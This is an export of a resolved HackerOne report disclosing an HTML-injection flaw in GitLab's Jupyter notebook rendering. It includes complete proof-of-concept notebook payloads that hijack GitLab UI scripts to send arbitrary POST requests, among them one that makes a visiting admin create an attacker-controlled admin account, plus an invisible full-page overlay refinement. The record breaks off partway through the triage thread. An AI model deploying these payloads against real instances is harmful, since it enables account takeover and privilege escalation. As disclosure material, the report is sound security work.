{
  "id": 1409788,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDA5Nzg4",
  "url": "https://hackerone.com/reports/1409788",
  "title": "Arbitrary POST request as victim user from HTML injection in Jupyter notebooks",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-11-24T23:18:41.801Z",
  "submitted_at": "2021-11-24T23:18:42.001Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "joaxcar",
    "url": "/joaxcar",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=066dcff2cca5db24a90363942a9f90be3ed93a6d422b27596601d89be8dbfe66"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-05-20T14:32:25.611Z",
  "bug_reporter_agreed_on_going_public_at": "2022-03-29T14:25:04.535Z",
  "team_member_agreed_on_going_public_at": "2022-05-20T14:32:25.432Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nAn attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the \"worst case\" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.\n\nThis research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.\n\nThe script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.\n\n```\nfunction deferredInitialisation() {\n  const $body = $('body');\n\n  initTopNav();\n  initBreadcrumbs();\n  initTodoToggle();\n  initLogoAnimation();\n  initServicePingConsent();\n  initUserPopovers();\n  initBroadcastNotifications();\n  initPersistentUserCallouts();\n  initDefaultTrackers();\n  initFeatureHighlight();\n```\n\nReading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.\n\nAs an example we have persistent_user_callout in\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js\n\nwhere a POST request is made like\n\n```\ndismiss(event, deferredLinkOptions = null) {\n    event.preventDefault();\n\n    axios\n      .post(this.dismissEndpoint, {\n        feature_name: this.featureId,\n      })\n```\n\nthe `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so\n\n```\nexport default class PersistentUserCallout {\n  constructor(container, options = container.dataset) {\n    const { dismissEndpoint, featureId, deferLinks } = options;\n    this.container = container;\n    this.dismissEndpoint = dismissEndpoint;\n    this.featureId = featureId;\n    this.deferLinks = parseBoolean(deferLinks);\n\n    this.init();\n  }\n```\n\nTo be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button\n\n```\nconst closeButton = this.container.querySelector('.js-close');\n```\n\nThe HTML needed to set this up is\n\n```\n<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\">\n    <button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">\n        hack\n    </button>\n</div>\n```\n\nThe styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.\n\nNow to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.\n\nA file like this will do as a simple POC\n\n```\n{\n  \"cells\": [\n    {\n      \"metadata\": { \"trusted\": true },\n      \"cell_type\": \"code\",\n      \"source\": \"<h1>asd</h1>\",\n      \"execution_count\": 1,\n      \"outputs\": [\n        {\n          \"output_type\": \"display_data\",\n          \"data\": {\n            \"text/plain\": \"<IPython.core.display.HTML object>\",\n            \"text/html\": \"<div class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\">asdf</div>\\n<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">hack</button></div>\\n\"\n          },\n          \"metadata\": {}\n        }\n      ]\n    }\n  ],\n  \"metadata\": {\n    \"kernelspec\": {\n      \"name\": \"python3\",\n      \"display_name\": \"Python 3\",\n      \"language\": \"python\"\n    },\n    \"language_info\": {\n      \"name\": \"python\",\n      \"version\": \"3.7.8\",\n      \"mimetype\": \"text/x-python\",\n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n      \"pygments_lexer\": \"ipython3\",\n      \"nbconvert_exporter\": \"python\",\n      \"file_extension\": \".py\"\n    }\n  },\n  \"nbformat\": 4,\n  \"nbformat_minor\": 4\n}\n```\n\nI have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload \"load up\" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.\n\n{F1525031}\n\nVisiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one\n\n```\n\"text/html\": \"<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">.</button></div>\\n\"}\n```\n\nA visit by an admin to this site would end up with a new admin account being created.\n\nFinally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.\n\n### Steps to reproduce\n1. Create a project on GitLab.com\n2. Create a new file named `hack.ipynb` (or upload the included file) with the content\n{F1525030}\n```\n{\n  \"cells\": [\n    {\n      \"metadata\": { \"trusted\": true },\n      \"cell_type\": \"code\",\n      \"source\": \"<h1>asd</h1>\",\n      \"execution_count\": 1,\n      \"outputs\": [\n        {\n          \"output_type\": \"display_data\",\n          \"data\": {\n            \"text/plain\": \"<IPython.core.display.HTML object>\",\n            \"text/html\": \"<div class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\">asdf</div>\\n<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\"><button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">hack</button></div>\\n\"\n          },\n          \"metadata\": {}\n        }\n      ]\n    }\n  ],\n  \"metadata\": {\n    \"kernelspec\": {\n      \"name\": \"python3\",\n      \"display_name\": \"Python 3\",\n      \"language\": \"python\"\n    },\n    \"language_info\": {\n      \"name\": \"python\",\n      \"version\": \"3.7.8\",\n      \"mimetype\": \"text/x-python\",\n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n      \"pygments_lexer\": \"ipython3\",\n      \"nbconvert_exporter\": \"python\",\n      \"file_extension\": \".py\"\n    }\n  },\n  \"nbformat\": 4,\n  \"nbformat_minor\": 4\n}\n```\n3. Click save\n4. After saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.\n5. When the dot is blue click anywhere on the page\n6. Now go to https://gitlab.com/dashboard/todos and check that a todo have been added\n\nvideo example of the POC (note the todo being empty and the blue dot):\n\n█████\n\n### Impact\n\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.\n\n### Examples\n\nPrivate project:\nhttps://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb\n\n### What is the current *bug* behavior?\n\nDOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests\n\n### What is the expected *correct* behavior?\n\nThe attributes should not work in Jupyter notebooks\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nAn attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.",
  "bounty_amount": "8690.0",
  "formatted_bounty": "$8,690",
  "weakness": {
    "id": 72,
    "name": "Resource Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1525030,
      "file_name": "hack.ipynb",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/obpx495lv7qhhl5mzlps9ybqb7yy?response-content-disposition=attachment%3B%20filename%3D%22hack.ipynb%22%3B%20filename%2A%3DUTF-8%27%27hack.ipynb&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b28f5b766dd23816675230dc90dbedba59c3d8c14a73de81f023a60ad7b82ac3",
      "file_size": 1419,
      "type": "application/octet-stream",
      "moderated": null
    },
    {
      "id": 1525031,
      "file_name": "dot.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ys8u33tr2wlbli3fmelx49x84wam?response-content-disposition=attachment%3B%20filename%3D%22dot.png%22%3B%20filename%2A%3DUTF-8%27%27dot.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=61555d2e6c0049a9cecad3c7acc0cc138835d0c118eb8f7652747dd04692872a",
      "file_size": 73186,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 45,
  "voters": [
    "xenx",
    "jumpydata",
    "martinvw",
    "taharbenaissadz",
    "learn_more",
    "nytr0gen",
    "n1m0",
    "haxor31337",
    "palaziv",
    "xploiterr",
    "and 35 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 18138,
    "asset_type": "URL",
    "asset_identifier": "gitlab.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 14439995,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hello @joaxcar and thanks for your report,\n\nWhich is the field you are trying to exploit? `\"text/html\"` or `source`?\n\nIf it's for `text/html`, it seems like you did the PoC just for your own account because there is your project there. How should I craft one for my own account? I tried to roughly put my project id there but it did not work. \n\n\nBest regards,\n@turtle_shell",
      "automated_response": false,
      "created_at": "2021-11-25T11:11:29.189Z",
      "updated_at": "2021-11-25T11:11:29.189Z",
      "actor": {
        "username": "h1_analyst_caesar",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_caesar",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/2bkb69nvrwhkybw7m3gi9o2dumgp/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14442664,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @turtle_shell thank you for looking into the report! And sorry for the confusing POC, I assumed that you would test this on gitlab.com and then it would be no problem using the POC straight \"out of the box\" as anyone can create a ToDo on my public project. So it should work unmodified. If you want to test it on another server first do:\n\n1. Create a new public project, take a note of the project ID\n2. Create a new issue on the project (this will get IID of 1)\n3. Modify the POC with your new project ID and test\n\nI tried to find a POST request with a wide scope for the POC but I can look for another one that have a clearer impact. You can look in the DevTools (F12) to see that the POST request is fired even if it fails.\n\nI have tweaked the POC a bit to make it more consistent and effective (the payload is in the text/html block):\n\n```\n{\n  \"cells\": [\n    {\n      \"metadata\": { \"trusted\": true },\n      \"cell_type\": \"code\",\n      \"source\": \"hej\",\n      \"execution_count\": 1,\n      \"outputs\": [\n        {\n          \"output_type\": \"display_data\",\n          \"data\": {\n            \"text/plain\": \"<IPython.core.display.HTML object>\",\n            \"text/html\": [\n              \"<a href=\\\"https://gitlab.com/joaxcar-test03/joaxcar-test03/-/blob/main/test.ipynb\\\" class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\\\">.</a>\",\n            \"<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\">\",\n            \"<button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">\",\n            \"hack\",\n            \"</button>\",\n            \"</div>\"\n            ]},\n          \"metadata\": {}\n        }\n      ]\n    }\n  ],\n  \"metadata\": {\n    \"kernelspec\": {\n      \"name\": \"python3\",\n      \"display_name\": \"Python 3\",\n      \"language\": \"python\"\n    },\n    \"language_info\": {\n      \"name\": \"python\",\n      \"version\": \"3.7.8\",\n      \"mimetype\": \"text/x-python\",\n      \"codemirror_mode\": { \"name\": \"ipython\", \"version\": 3 },\n      \"pygments_lexer\": \"ipython3\",\n      \"nbconvert_exporter\": \"python\",\n      \"file_extension\": \".py\"\n    }\n  },\n  \"nbformat\": 4,\n  \"nbformat_minor\": 4\n}\n```\nThis one will fill the screen with an overlay linking to the same site if the payload is not \"activated\".  This is the ` \"<a href=\"\" class=\\\"js-feature-highlight\\\"` part. This makes the attack \"guarantied\" to succeed as long as the user tries to click the UI. If the payload is not loaded the page will link back to it self. If it is loaded, the link will be transformed to a feature-highlight blue dot and the POST payload will be the new full screen link, this is the `<div class=\\\"js-new-user-signups-cap-reached\\\"` part. In this POC you have to replace the data-dismiss-endpoint to an existing public issue, and the `a href` to the place where you have uploaded the Notebook.\n\nHope this clarifies things. I will get back with some additional information later tonight when I have the time to write it down.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2021-11-25T13:07:42.173Z",
      "updated_at": "2021-11-25T13:09:09.461Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14461994,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
